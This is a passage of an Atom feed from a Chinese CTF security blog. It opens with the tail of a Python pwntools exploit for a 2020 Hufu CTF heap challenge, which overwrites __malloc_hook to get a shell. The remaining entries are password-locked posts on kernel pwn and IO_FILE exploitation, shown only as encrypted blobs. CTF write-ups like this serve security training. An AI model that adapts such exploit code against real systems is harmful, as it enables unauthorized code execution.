class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-24T12:22:10.151Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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